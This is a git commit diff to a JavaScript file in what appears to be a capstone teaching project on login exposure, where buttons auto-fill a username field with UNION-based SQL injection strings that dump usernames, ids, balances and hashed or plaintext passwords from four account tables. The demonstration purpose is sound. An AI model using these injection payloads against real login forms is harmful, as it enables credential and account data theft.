1ba6e2093d5e6a8a6f9531111ca48022653c1f88
Susan <hibbert.susan@gmail.com>
2020-11-19 12:04:59 -0800

    Update login_exposure.js

--- capstone/static/script/login_exposure.js
+++ capstone/static/script/login_exposure.js
@@ -1,19 +1,19 @@
 document.getElementById("sde1").addEventListener("click", function(){
-	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, encrypted_password FROM accounts_md5;#";
+	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, id, balance, encrypted_password FROM accounts_md5;#";
 	document.getElementById('dbToken').value = "2";
 });
 
 document.getElementById("sde2").addEventListener("click", function(){
-	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, encrypted_password FROM accounts_sha256;#";
+	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, id, balance, encrypted_password FROM accounts_sha256;#";
 	document.getElementById('dbToken').value = "3";
 });
 
 document.getElementById("sde3").addEventListener("click", function(){
-	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, password FROM accounts_unencrypted;#";
+	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, id, balance, password FROM accounts_unencrypted;#";
 	document.getElementById('dbToken').value = "1";
 });
 
 document.getElementById("sde4").addEventListener("click", function(){
-	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, encrypted_password FROM accounts_base64;#";
+	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, id, balance, encrypted_password FROM accounts_base64;#";
 	document.getElementById('dbToken').value = "1";
 });
